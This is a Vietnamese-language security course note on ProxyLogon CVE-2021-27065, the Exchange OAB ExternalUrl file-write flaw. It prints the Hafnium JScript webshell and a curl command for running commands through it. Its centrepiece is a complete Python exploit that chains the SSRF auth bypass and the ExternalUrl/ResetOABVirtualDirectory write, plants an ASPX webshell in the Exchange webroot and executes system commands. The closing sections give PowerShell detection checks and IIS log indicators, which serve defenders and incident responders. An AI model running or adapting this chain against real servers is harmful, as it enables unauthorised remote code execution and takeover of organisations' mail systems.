---
title: "19. ProxyLogon Part 2 — CVE-2021-27065 File Write & Full Chain PoC"
tags: [security, cve, landmark-cves, proxylogon, exchange, webshell, file-write, rce, lesson-19]
aliases: [ProxyLogon Part 2, CVE-2021-27065 Exploit]
created: 2026-03-24
---

> **Prerequisites**: [[18-proxylogon-ssrf-auth-bypass|18. ProxyLogon Part 1]], Exchange OAB/ECP basics
> **Objectives**:
> - Hiểu CVE-2021-27065: OAB Virtual Directory `ExternalUrl` file write mechanism
> - Trace cơ chế: `Set-OabVirtualDirectory` → `ResetOABVirtualDirectory.xaml` → ghi file ra webroot
> - Viết full chain PoC Python: SSRF → proxyLogon.ecp → ECP session → Set-OabVirtualDirectory → Reset → webshell
> - Phân tích ASPX/JScript webshell được Hafnium deploy
> - Hiểu IIS log detection pattern, PowerShell incident response
> - So sánh CVE-2021-26858 và CVE-2021-27065 trong cùng attack chain

---

## Recap: Vị Trí của CVE-2021-27065 trong Chain

```text
CVE-2021-26855 (SSRF) → bypass auth, ECP session as admin
CVE-2021-27065 (file write) → ghi ASPX webshell vào webroot
                              ↑ Bài này
→ Webshell accessible qua HTTPS → RCE hoàn toàn
```

Sau khi có ECP session hợp lệ từ bài 18, attacker cần một cách để viết file lên server. Đây là vai trò của CVE-2021-27065.

---

## CVE-2021-27065 — OAB Virtual Directory File Write

### OAB (Offline Address Book) là gì?

OAB là tính năng Exchange cho phép Outlook client download address book để dùng offline. OAB Virtual Directory (`/OAB/`) là IIS virtual directory phục vụ OAB files.

Exchange quản lý OAB Virtual Directory qua ECP (Exchange Control Panel). Admin có thể:
- `Get-OabVirtualDirectory`: xem cấu hình
- `Set-OabVirtualDirectory`: thay đổi cấu hình
- `ResetOABVirtualDirectory`: reset và export cấu hình ra file

### Cơ Chế File Write

`Set-OabVirtualDirectory` có parameter `ExternalUrl` — URL external của OAB service. Trong trường hợp bình thường, đây là `https://mail.company.com/OAB`.

Tuy nhiên, Exchange không validate nội dung của `ExternalUrl`. Attacker có thể đặt giá trị này thành **ASPX webshell code** embedded trong URL string:

```text
ExternalUrl = "http://o/#<script language='JScript' runat='server'>
               function Page_Load(){eval(Request['cmd'],'unsafe')} </script>"
```

Sau đó, khi gọi `ResetOABVirtualDirectory`, Exchange export cấu hình OAB ra file. Parameter `--confirm:$false` cho phép chỉ định **output file path** — và attacker đặt path này vào thư mục web root của Exchange.

Kết quả: file được tạo tại web root với nội dung là ASPX webshell code từ `ExternalUrl`.

> [!definition] Definition 19.1 — CVE-2021-27065 Root Cause
> `ResetOABVirtualDirectory.xaml` ECP handler không validate đường dẫn output file. Kết hợp với việc `ExternalUrl` không được sanitize, attacker có thể:
> 1. Set `ExternalUrl` = webshell code
> 2. Gọi Reset với output path = `C:\inetpub\wwwroot\aspnet_client\webshell.aspx`
> 3. Exchange ghi cấu hình (chứa webshell) ra file đó
> 4. IIS serve file → webshell có thể truy cập từ internet

---

## ASPX JScript Webshell — Phân Tích Hafnium Payload

Hafnium và các threat actor khác dùng webshell dạng ASPX/JScript:

```aspx
<!-- Webshell được Hafnium deploy thực tế -->
<script language="JScript" runat="server">
function Page_Load(){
    eval(Request["kxpprfgvnosz"], "unsafe");
}
</script>
```

Giải thích:
- `language="JScript" runat="server"`: đây là Server-Side JavaScript (JScript) chạy trong IIS ASP.NET pipeline
- `eval(Request["kxpprfgvnosz"], "unsafe")`: evaluate bất kỳ code nào từ HTTP parameter `kxpprfgvnosz`
- `"unsafe"` flag: cho phép eval execute code với full quyền
- Parameter name ngẫu nhiên: `kxpprfgvnosz` là random string để tránh simple pattern matching

Cách dùng webshell sau khi deploy:

```bash
curl -k -X POST "https://exchange.victim.com/aspnet_client/shell.aspx" \
  --data 'kxpprfgvnosz=Response.Write(new ActiveXObject("WScript.Shell").Exec("cmd /c whoami").StdOut.ReadAll())'
```

---

## Full Exploit Chain — Python PoC

```python
import requests
import re
import json
import urllib3
urllib3.disable_warnings()

# ==========================================
# CONFIG
# ==========================================
FRONTEND    = "https://exchange.victim.com"
BACKEND     = "exchange.internal.victim.com"
EMAIL       = "administrator@victim.com"
ADMIN_SID   = "S-1-5-21-XXXX-XXXX-XXXX-500"  # replace với actual SID
WEBSHELL_PATH = (
    r"C:\Program Files\Microsoft\Exchange Server\V15"
    r"\FrontEnd\HttpProxy\ecp\auth\shell.aspx"
)
WEBSHELL_URL  = f"{FRONTEND}/ecp/auth/shell.aspx"
WEBSHELL_KEY  = "kxpprfgvnosz"

# Webshell content (embedded trong ExternalUrl)
WEBSHELL_BODY = (
    '<script language="JScript" runat="server">'
    f'function Page_Load(){{eval(Request["{WEBSHELL_KEY}"],"unsafe");}}'
    '</script>'
)

# ==========================================
# BƯỚC 1: Lấy ECP session qua SSRF + proxyLogon.ecp
# ==========================================
def get_ecp_session(frontend, backend, admin_sid):
    """
    Dùng CVE-2021-26855 SSRF để authenticate vào ECP
    bằng cách call /ecp/proxyLogon.ecp với admin SID.
    Trả về (session_id, canary) để dùng trong các bước sau.
    """
    # Step 1a: Lấy FQDN backend và LegacyDN qua Autodiscover
    print("[*] Step 1: Fetching LegacyDN via Autodiscover...")
    autodiscover_body = f"""<?xml version="1.0" encoding="utf-8"?>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
  <Request>
    <EMailAddress>{EMAIL}</EMailAddress>
    <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
  </Request>
</Autodiscover>"""

    headers_ad = {
        "Content-Type": "text/xml",
        "Cookie": f"X-BEResource={backend}/autodiscover/autodiscover.xml?a=\\x00AAAA",
    }
    resp_ad = requests.post(
        f"{frontend}/autodiscover/autodiscover.xml",
        data=autodiscover_body,
        headers=headers_ad,
        verify=False, timeout=15
    )
    legacy_dn_match = re.search(r'<LegacyDN>([^<]+)</LegacyDN>', resp_ad.text)
    if not legacy_dn_match:
        print(f"[-] Could not get LegacyDN. Response: {resp_ad.text[:200]}")
        return None, None
    legacy_dn = legacy_dn_match.group(1)
    print(f"[+] LegacyDN: {legacy_dn}")

    # Step 1b: Gọi proxyLogon.ecp để tạo ECP session với admin SID
    print("[*] Step 2: Calling /ecp/proxyLogon.ecp...")
    proxylogon_body = f"""<r at="Negotiate" ln="{legacy_dn}">
  <s>
    <s t="1">{admin_sid}</s>
  </s>
</r>"""

    headers_pl = {
        "Content-Type": "text/xml; charset=utf-8",
        "msExchLogonMailbox": "SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}",
        "Cookie": (
            f"X-BEResource={backend}/ecp/proxyLogon.ecp?a=\\x00AAAA; "
            f"X-AnonResource=true"
        ),
    }
    resp_pl = requests.post(
        f"{frontend}/ecp/x.js",
        data=proxylogon_body,
        headers=headers_pl,
        verify=False, timeout=15
    )

    # Extract session cookies
    session_id = resp_pl.cookies.get("ASP.NET_SessionId")
    canary     = resp_pl.cookies.get("msExchEcpCanary")

    if not session_id or not canary:
        print(f"[-] Could not get ECP session. Status: {resp_pl.status_code}")
        print(f"    Cookies: {dict(resp_pl.cookies)}")
        return None, None

    print(f"[+] ECP Session obtained!")
    print(f"    SessionId: {session_id[:20]}...")
    print(f"    Canary: {canary[:20]}...")
    return session_id, canary

# ==========================================
# BƯỚC 2: Set-OabVirtualDirectory với webshell payload
# ==========================================
def set_oab_external_url(frontend, session_id, canary, webshell_content):
    """
    Gọi ECP API để set ExternalUrl của OAB Virtual Directory
    thành nội dung webshell.
    """
    print("[*] Step 3: Getting OAB Virtual Directory...")
    headers = {
        "Cookie": f"ASP.NET_SessionId={session_id}; msExchEcpCanary={canary}",
        "msExchEcpCanary": canary,
        "Content-Type": "application/json; charset=utf-8",
    }

    # Lấy identity của OAB Virtual Directory
    resp_get = requests.post(
        f"{frontend}/ecp/DDI/DDIService.svc/GetObject",
        headers=headers,
        json={
            "filter": {"Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel", "SelectedView": ""}},
            "schema": "OABVirtualDirectory",
        },
        verify=False, timeout=15
    )
    identity_match = re.search(r'"Identity":\{"__type":"Identity[^"]*","DisplayName":"([^"]+)"', resp_get.text)
    oab_identity = identity_match.group(1) if identity_match else "OAB (Default Web Site)"
    print(f"[+] OAB VDir identity: {oab_identity}")

    # Set ExternalUrl = webshell content
    print(f"[*] Step 4: Setting ExternalUrl to webshell payload...")
    resp_set = requests.post(
        f"{frontend}/ecp/DDI/DDIService.svc/SetObject",
        headers=headers,
        json={
            "identity": {
                "__type": "Identity:#Microsoft.Exchange.Management.ControlPanel",
                "DisplayName": oab_identity,
                "RawIdentity": oab_identity,
            },
            "properties": {
                "Parameters": {
                    "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                    "ExternalUrl": f"http://o/#{webshell_content}",
                }
            },
            "schema": "OABVirtualDirectory",
        },
        verify=False, timeout=15
    )
    print(f"[*] Set ExternalUrl response: {resp_set.status_code}")
    return oab_identity

# ==========================================
# BƯỚC 3: ResetOABVirtualDirectory → ghi file
# ==========================================
def reset_oab_write_webshell(frontend, session_id, canary, oab_identity, output_path):
    """
    Gọi ResetOABVirtualDirectory với output_path = webroot path
    → Exchange ghi cấu hình (chứa ExternalUrl webshell) ra file.
    """
    print(f"[*] Step 5: Resetting OAB VDir → writing webshell to {output_path}...")
    headers = {
        "Cookie": f"ASP.NET_SessionId={session_id}; msExchEcpCanary={canary}",
        "msExchEcpCanary": canary,
        "Content-Type": "application/json; charset=utf-8",
    }

    resp_reset = requests.post(
        f"{frontend}/ecp/DDI/DDIService.svc/NewObject",
        headers=headers,
        json={
            "identity": {
                "__type": "Identity:#Microsoft.Exchange.Management.ControlPanel",
                "DisplayName": oab_identity,
                "RawIdentity": oab_identity,
            },
            "properties": {
                "Parameters": {
                    "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                    "FilePathName": output_path,
                }
            },
            "schema": "ResetOABVirtualDirectory",
        },
        verify=False, timeout=15
    )
    print(f"[*] Reset response: {resp_reset.status_code}")
    if resp_reset.status_code in [200, 500]:
        print(f"[+] File write attempted (500 may still succeed)")
        return True
    return False

# ==========================================
# BƯỚC 4: Verify và sử dụng webshell
# ==========================================
def use_webshell(shell_url, key, command):
    """Execute command qua webshell."""
    jscript_cmd = (
        f'Response.Write(new ActiveXObject("WScript.Shell")'
        f'.Exec("cmd /c {command}").StdOut.ReadAll())'
    )
    try:
        resp = requests.post(
            shell_url,
            data={key: jscript_cmd},
            verify=False, timeout=15
        )
        if resp.status_code == 200:
            return resp.text.strip()
        return f"HTTP {resp.status_code}"
    except Exception as e:
        return f"Error: {e}"

# ==========================================
# MAIN — full chain
# ==========================================
def full_exploit():
    print("=" * 60)
    print("ProxyLogon Full Chain PoC")
    print("CVE-2021-26855 + CVE-2021-27065")
    print("=" * 60)
    print()

    # 1. Auth bypass via SSRF
    session_id, canary = get_ecp_session(FRONTEND, BACKEND, ADMIN_SID)
    if not session_id:
        print("[-] Failed to get ECP session. Exiting.")
        return

    print()

    # 2. Set webshell in OAB ExternalUrl
    oab_id = set_oab_external_url(
        FRONTEND, session_id, canary, WEBSHELL_BODY
    )

    print()

    # 3. Reset OAB → write file to webroot
    reset_oab_write_webshell(
        FRONTEND, session_id, canary, oab_id, WEBSHELL_PATH
    )

    print()

    # 4. Test webshell
    import time
    time.sleep(2)
    print("[*] Step 6: Testing webshell access...")
    for cmd in ["whoami", "ipconfig", "hostname"]:
        result = use_webshell(WEBSHELL_URL, WEBSHELL_KEY, cmd)
        print(f"  > {cmd}: {result[:100] if result else '(no output)'}")

    print()
    print(f"[+] Webshell deployed: {WEBSHELL_URL}")
    print(f"[+] Usage: POST {WEBSHELL_URL}")
    print(f"    data: {WEBSHELL_KEY}=Response.Write(cmd_output)")

if __name__ == "__main__":
    full_exploit()
```

---

## Detection & Incident Response

### PowerShell Detection Script

```powershell
# Microsoft cung cấp Test-ProxyLogon.ps1
# https://github.com/microsoft/CSS-Exchange/tree/main/Security
.\Test-ProxyLogon.ps1 -OutPath C:\results\

# Manual checks:

# 1. Kiểm tra OAB VDir ExternalUrl có chứa script không
Get-OabVirtualDirectory | Select Server, ExternalUrl | Format-List
# Flag bất kỳ URL nào chứa <script>, eval, JScript

# 2. Tìm webshell files mới tạo
$paths = @(
    "C:\inetpub\wwwroot\aspnet_client\",
    "C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\",
    "C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\ecp\auth\"
)
foreach ($path in $paths) {
    Get-ChildItem $path -Recurse -Include *.aspx, *.ashx, *.asmx |
        Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-30) } |
        Select FullName, LastWriteTime, Length
}

# 3. IIS log: tìm POST request đến suspicious ASPX
$iisLog = "C:\inetpub\logs\LogFiles\W3SVC1\"
Get-ChildItem $iisLog -Filter "u_ex*.log" |
    ForEach-Object {
        Select-String -Path $_.FullName -Pattern "\.aspx.*POST|POST.*\.aspx" |
        Where-Object { $_ -match "200|302" }
    } | Select-Object -First 20

# 4. Event log: OABGenerator anomalies
Get-WinEvent -LogName "MSExchange Management" |
    Where-Object { $_.Message -match "Set-OabVirtualDirectory|ResetOABVirtualDirectory" } |
    Select TimeCreated, Message | Format-List
```

### IIS Log Indicators

```text
Dấu hiệu trong IIS logs:

Pattern 1 — SSRF trigger:
  POST /ecp/x.js 200 (hoặc bất kỳ static extension)
  với Cookie: X-AnonResource-Backend=...

Pattern 2 — proxyLogon.ecp access:
  POST /ecp/DDI/DDIService.svc/SetObject
  với body chứa "ExternalUrl" và "ResetOABVirtualDirectory"

Pattern 3 — Webshell access:
  POST /aspnet_client/*.aspx 200
  POST /ecp/auth/*.aspx 200
  Thường với Content-Length nhỏ (webshell command ngắn)

Webshell locations thường thấy:
  /aspnet_client/system_web/*.aspx
  /owa/auth/*.aspx
  /ecp/auth/*.aspx
```

---

## CVE-2021-26858 vs CVE-2021-27065 — Sự Khác Biệt

| Đặc điểm | CVE-2021-26858 | CVE-2021-27065 |
|----------|---------------|---------------|
| Trigger | Download OAB file → path traversal | Reset OAB VDir → write ExternalUrl content |
| Cần auth | Có (post-auth) | Có (post-auth via SSRF) |
| Path control | Partial (extension-limited) | Full path control |
| Phổ biến trong wild | Ít hơn | Hay dùng hơn (flexible) |
| Detection | OABGenerator "Download failed" events | Set-OabVirtualDirectory logs |

---

## Summary

- CVE-2021-27065: `Set-OabVirtualDirectory` không validate `ExternalUrl` → attacker nhúng webshell code
- `ResetOABVirtualDirectory.xaml` với `FilePathName` parameter → viết ra bất kỳ path nào → webroot
- Full chain: SSRF (26855) → ECP session → Set ExternalUrl = webshell → Reset → ASPX webshell online
- Webshell Hafnium: JScript `eval(Request["key"], "unsafe")` — thực thi server-side JavaScript tùy ý
- Detection: PowerShell `Test-ProxyLogon.ps1`, IIS log POST đến `.aspx`, OABGenerator event log, file audit
- Patch: March 2021 cumulative updates; URL Rewrite rule như workaround tạm thời

---

## References

- DEVCORE Orange Tsai original chain: https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/
- Praetorian full PoC: https://github.com/praetorian-inc/proxylogon-exploit
- BI.ZONE hunting guide: https://bi-zone.medium.com/hunting-down-ms-exchange-attacks-part-1-proxylogon
- Microsoft CSS-Exchange detection script: https://github.com/microsoft/CSS-Exchange/tree/main/Security
- SentinelOne CVE-2021-27065: https://www.sentinelone.com/vulnerability-database/cve-2021-27065/
- CISA Emergency Directive 21-02: https://www.cisa.gov/emergency-directive-21-02
